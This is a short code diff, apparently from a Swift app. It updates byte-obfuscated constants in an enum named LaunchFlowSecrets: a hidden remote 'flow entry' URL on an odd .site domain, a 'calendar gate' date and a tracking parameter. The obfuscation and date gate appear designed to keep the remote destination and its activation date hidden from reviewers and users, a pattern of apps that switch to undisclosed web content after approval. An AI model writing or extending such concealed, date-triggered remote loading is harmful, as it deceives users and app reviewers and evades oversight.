@@ -21,11 +21,11 @@ enum LaunchFlowSecrets {
     }
 
     static var remoteFlowEntryTemplate: String {
-        unfold([50, 46, 46, 42, 41, 96, 117, 117, 42, 59, 61, 63, 116, 46, 59, 41, 46, 63, 41, 51, 55, 42, 54, 51, 57, 51, 46, 35, 105, 105, 104, 61, 47, 51, 62, 63, 116, 41, 51, 46, 63, 117, 43, 46, 57, 55, 18, 25, 18, 109], blend: 0x5A)
+        unfold([50, 46, 46, 42, 41, 96, 117, 117, 46, 59, 41, 46, 63, 105, 105, 104, 41, 51, 55, 42, 54, 51, 57, 51, 46, 35, 61, 47, 51, 62, 63, 116, 41, 51, 46, 63, 117, 8, 29, 3, 20, 108, 40], blend: 0x5A)
     }
 
     static var calendarGateAnchor: String {
-        unfold([104, 106, 116, 106, 99, 116, 104, 106, 104, 108], blend: 0x5A)
+        unfold([107, 109, 116, 107, 107, 116, 104, 106, 104, 108], blend: 0x5A)
     }
 
     static var trackingSegmentParameterName: String {
